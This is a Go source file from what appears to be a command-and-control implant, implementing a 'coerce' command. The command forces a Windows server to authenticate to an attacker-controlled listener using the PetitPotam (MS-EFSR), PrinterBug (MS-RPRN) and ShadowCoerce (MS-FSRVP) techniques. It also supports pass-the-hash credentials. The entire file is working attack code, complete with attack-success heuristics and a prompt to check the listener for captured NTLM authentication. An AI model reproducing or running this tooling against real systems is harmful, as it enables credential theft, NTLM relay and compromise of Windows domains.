package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	efsrpc "github.com/oiweiwei/go-msrpc/msrpc/efsr/efsrpc/v1"
	fsrvp "github.com/oiweiwei/go-msrpc/msrpc/fsrvp/fileservervssagent/v1"
	winspool "github.com/oiweiwei/go-msrpc/msrpc/rprn/winspool/v1"
	"github.com/oiweiwei/go-msrpc/ssp"
	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
)

type CoerceCommand struct{}

func (c *CoerceCommand) Name() string        { return "coerce" }
func (c *CoerceCommand) Description() string { return "NTLM authentication coercion via MS-EFSR/MS-RPRN/MS-FSRVP (T1187)" }

type coerceArgs struct {
	Server   string `json:"server"`   // target server to coerce
	Listener string `json:"listener"` // attacker IP/hostname to receive auth
	Method   string `json:"method"`   // petitpotam, printerbug, shadowcoerce, all
	Username string `json:"username"` // auth credentials
	Password string `json:"password"`
	Hash     string `json:"hash"`
	Domain   string `json:"domain"`
	Timeout  int    `json:"timeout"`
}

type coerceResult struct {
	Method  string
	Success bool
	Message string
}

func (c *CoerceCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -server <target> -listener <attacker-ip> [-method petitpotam|printerbug|shadowcoerce|all]",
			Status:    "error",
			Completed: true,
		}
	}

	var args coerceArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Server == "" || args.Listener == "" {
		return structs.CommandResult{
			Output:    "Error: server and listener are required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Username == "" || (args.Password == "" && args.Hash == "") {
		return structs.CommandResult{
			Output:    "Error: username and password (or hash) are required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Timeout <= 0 {
		args.Timeout = 30
	}

	if args.Method == "" {
		args.Method = "all"
	}
	args.Method = strings.ToLower(args.Method)

	// Parse domain from username
	if args.Domain == "" {
		if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
			args.Domain = parts[0]
			args.Username = parts[1]
		} else if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Domain = parts[1]
			args.Username = parts[0]
		}
	}

	credUser := args.Username
	if args.Domain != "" {
		credUser = args.Domain + `\` + args.Username
	}

	// Build credential
	var cred sspcred.Credential
	if args.Hash != "" {
		hash := args.Hash
		if parts := strings.SplitN(hash, ":", 2); len(parts) == 2 && len(parts[0]) == 32 && len(parts[1]) == 32 {
			hash = parts[1]
		}
		cred = sspcred.NewFromNTHash(credUser, hash)
	} else {
		cred = sspcred.NewFromPassword(credUser, args.Password)
	}

	var sb strings.Builder
	authMethod := "password"
	if args.Hash != "" {
		authMethod = "PTH"
	}
	sb.WriteString(fmt.Sprintf("[*] NTLM coercion against %s → %s (%s)\n", args.Server, args.Listener, authMethod))
	sb.WriteString(fmt.Sprintf("[*] Credentials: %s\n", credUser))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	methods := []string{}
	switch args.Method {
	case "petitpotam", "efsr":
		methods = []string{"petitpotam"}
	case "printerbug", "rprn", "spoolsample":
		methods = []string{"printerbug"}
	case "shadowcoerce", "fsrvp":
		methods = []string{"shadowcoerce"}
	case "all":
		methods = []string{"petitpotam", "printerbug", "shadowcoerce"}
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown method '%s'. Use petitpotam, printerbug, shadowcoerce, or all", args.Method),
			Status:    "error",
			Completed: true,
		}
	}

	successCount := 0
	for _, method := range methods {
		result := coerceExecuteMethod(method, args.Server, args.Listener, cred, args.Timeout)
		if result.Success {
			successCount++
			sb.WriteString(fmt.Sprintf("[+] %s: %s\n", result.Method, result.Message))
		} else {
			sb.WriteString(fmt.Sprintf("[-] %s: %s\n", result.Method, result.Message))
		}
	}

	sb.WriteString(strings.Repeat("-", 60) + "\n")
	sb.WriteString(fmt.Sprintf("[*] %d/%d methods succeeded\n", successCount, len(methods)))

	if successCount > 0 {
		sb.WriteString("[*] Check your listener for incoming NTLM authentication\n")
	}

	status := "success"
	if successCount == 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

func coerceExecuteMethod(method, server, listener string, cred sspcred.Credential, timeout int) coerceResult {
	switch method {
	case "petitpotam":
		return coercePetitPotam(server, listener, cred, timeout)
	case "printerbug":
		return coercePrinterBug(server, listener, cred, timeout)
	case "shadowcoerce":
		return coerceShadowCoerce(server, listener, cred, timeout)
	default:
		return coerceResult{Method: method, Success: false, Message: "unknown method"}
	}
}

// coerceDialNamedPipe connects to a target via SMB named pipe (ncacn_np)
func coerceDialNamedPipe(ctx context.Context, server, pipeName string) (dcerpc.Conn, error) {
	endpoint := fmt.Sprintf("ncacn_np:[%s]", pipeName)
	return dcerpc.Dial(ctx, server, dcerpc.WithEndpoint(endpoint))
}

// coerceIsRPCProcessed checks if an error indicates the RPC call was actually
// processed (coercion triggered) vs a transport/binding failure.
func coerceIsRPCProcessed(err error) bool {
	if err == nil {
		return true
	}
	errStr := err.Error()
	// These Win32/NTSTATUS errors mean the server processed the RPC call
	// and tried (or refused) the file operation — coercion was triggered
	processedIndicators := []string{
		"ERROR_BAD_NETPATH",      // target tried to resolve the UNC path
		"ERROR_ACCESS_DENIED",    // path processed but access denied
		"ERROR_BAD_NET_NAME",     // UNC share name not found (tried to connect)
		"ERROR_NOT_FOUND",        // resource not found (call processed)
		"ERROR_INVALID_PARAMETER", // parameter error (call reached handler)
		"0x00000035",             // BAD_NETPATH numeric
		"0x00000005",             // ACCESS_DENIED numeric
		"RPC_S_SERVER_UNAVAILABLE", // server tried to reach listener, listener not there
		"0x000006ba",             // RPC_S_SERVER_UNAVAILABLE numeric
	}
	for _, indicator := range processedIndicators {
		if strings.Contains(errStr, indicator) {
			return true
		}
	}
	return false
}

// coercePetitPotam uses MS-EFSR EfsRpcOpenFileRaw to trigger NTLM auth.
// Tries efsrpc pipe first, then lsarpc as fallback (original PetitPotam technique).
func coercePetitPotam(server, listener string, cred sspcred.Credential, timeout int) coerceResult {
	coercePath := fmt.Sprintf(`\\%s\share\file.txt`, listener)

	// Try efsrpc pipe first, then lsarpc as fallback
	pipes := []string{"efsrpc", "lsarpc"}
	var lastErr error

	for _, pipe := range pipes {
		ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background(),
			gssapi.WithCredential(cred),
			gssapi.WithMechanismFactory(ssp.SPNEGO),
			gssapi.WithMechanismFactory(ssp.NTLM),
		), time.Duration(timeout)*time.Second)

		cc, err := coerceDialNamedPipe(ctx, server, pipe)
		if err != nil {
			lastErr = fmt.Errorf("pipe %s: %v", pipe, err)
			cancel()
			continue
		}

		cli, err := efsrpc.NewEfsrpcClient(ctx, cc, dcerpc.WithSeal())
		if err != nil {
			lastErr = fmt.Errorf("pipe %s bind: %v", pipe, err)
			cc.Close(ctx)
			cancel()
			continue
		}

		_, err = cli.OpenFileRaw(ctx, &efsrpc.OpenFileRawRequest{
			FileName: coercePath,
			Flags:    0,
		})

		cc.Close(ctx)
		cancel()

		if err == nil {
			return coerceResult{Method: "PetitPotam (MS-EFSR)", Success: true,
				Message: fmt.Sprintf("EfsRpcOpenFileRaw via \\\\%s\\pipe\\%s (path: %s)", server, pipe, coercePath)}
		}

		if coerceIsRPCProcessed(err) {
			return coerceResult{Method: "PetitPotam (MS-EFSR)", Success: true,
				Message: fmt.Sprintf("EfsRpcOpenFileRaw via \\\\%s\\pipe\\%s (path: %s, response: %v)", server, pipe, coercePath, err)}
		}

		lastErr = fmt.Errorf("pipe %s: %v", pipe, err)
	}

	return coerceResult{Method: "PetitPotam (MS-EFSR)", Success: false,
		Message: fmt.Sprintf("all pipes failed: %v", lastErr)}
}

// coercePrinterBug uses MS-RPRN RpcRemoteFindFirstPrinterChangeNotification
func coercePrinterBug(server, listener string, cred sspcred.Credential, timeout int) coerceResult {
	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background(),
		gssapi.WithCredential(cred),
		gssapi.WithMechanismFactory(ssp.SPNEGO),
		gssapi.WithMechanismFactory(ssp.NTLM),
	), time.Duration(timeout)*time.Second)
	defer cancel()

	cc, err := coerceDialNamedPipe(ctx, server, "spoolss")
	if err != nil {
		return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: false,
			Message: fmt.Sprintf("connection to \\\\%s\\pipe\\spoolss failed: %v", server, err)}
	}
	defer cc.Close(ctx)

	cli, err := winspool.NewWinspoolClient(ctx, cc, dcerpc.WithSeal())
	if err != nil {
		return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: false,
			Message: fmt.Sprintf("winspool bind failed: %v", err)}
	}

	// Step 1: Open printer on the target server (use SERVER_ACCESS_ENUMERATE only)
	printerName := fmt.Sprintf(`\\%s`, server)
	openResp, err := cli.OpenPrinter(ctx, &winspool.OpenPrinterRequest{
		PrinterName:      printerName,
		DevModeContainer: &winspool.DevModeContainer{},
		AccessRequired:   0x00020008, // SERVER_ACCESS_ENUMERATE | SERVER_ACCESS_ADMINISTER
	})
	if err != nil {
		// Try with lower access rights
		openResp, err = cli.OpenPrinter(ctx, &winspool.OpenPrinterRequest{
			PrinterName:      printerName,
			DevModeContainer: &winspool.DevModeContainer{},
			AccessRequired:   0x00000002, // SERVER_ACCESS_ENUMERATE
		})
		if err != nil {
			return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: false,
				Message: fmt.Sprintf("OpenPrinter failed: %v", err)}
		}
	}

	// Step 2: RemoteFindFirstPrinterChangeNotification triggers auth to listener
	listenerHost := fmt.Sprintf(`\\%s`, listener)
	_, err = cli.RemoteFindFirstPrinterChangeNotification(ctx, &winspool.RemoteFindFirstPrinterChangeNotificationRequest{
		Printer:      openResp.Handle,
		Flags:        0x00000100, // PRINTER_CHANGE_ADD_JOB
		Options:      0,
		LocalMachine: listenerHost,
		PrinterLocal: 0,
	})

	if err == nil {
		return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: true,
			Message: fmt.Sprintf("RpcRemoteFindFirstPrinterChangeNotification via \\\\%s\\pipe\\spoolss (listener: %s)", server, listenerHost)}
	}

	if coerceIsRPCProcessed(err) {
		return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: true,
			Message: fmt.Sprintf("RpcRemoteFindFirstPrinterChangeNotification via \\\\%s\\pipe\\spoolss (listener: %s, response: %v)", server, listenerHost, err)}
	}

	return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: false,
		Message: fmt.Sprintf("RpcRemoteFindFirstPrinterChangeNotification failed: %v", err)}
}

// coerceShadowCoerce uses MS-FSRVP IsPathShadowCopied to trigger NTLM auth
func coerceShadowCoerce(server, listener string, cred sspcred.Credential, timeout int) coerceResult {
	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background(),
		gssapi.WithCredential(cred),
		gssapi.WithMechanismFactory(ssp.SPNEGO),
		gssapi.WithMechanismFactory(ssp.NTLM),
	), time.Duration(timeout)*time.Second)
	defer cancel()

	cc, err := coerceDialNamedPipe(ctx, server, "FssagentRpc")
	if err != nil {
		return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: false,
			Message: fmt.Sprintf("connection to \\\\%s\\pipe\\FssagentRpc failed (service may not be running): %v", server, err)}
	}
	defer cc.Close(ctx)

	cli, err := fsrvp.NewFileServerVSSAgentClient(ctx, cc, dcerpc.WithSeal())
	if err != nil {
		return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: false,
			Message: fmt.Sprintf("FSRVP bind failed (service may not be running): %v", err)}
	}

	// IsPathShadowCopied with UNC path pointing to listener triggers NTLM auth
	coercePath := fmt.Sprintf(`\\%s\share`, listener)
	_, err = cli.IsPathShadowCopied(ctx, &fsrvp.IsPathShadowCopiedRequest{
		ShareName: coercePath,
	})

	if err == nil {
		return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: true,
			Message: fmt.Sprintf("IsPathShadowCopied via \\\\%s\\pipe\\FssagentRpc (path: %s)", server, coercePath)}
	}

	if coerceIsRPCProcessed(err) {
		return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: true,
			Message: fmt.Sprintf("IsPathShadowCopied via \\\\%s\\pipe\\FssagentRpc (path: %s, response: %v)", server, coercePath, err)}
	}

	return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: false,
		Message: fmt.Sprintf("IsPathShadowCopied failed: %v", err)}
}
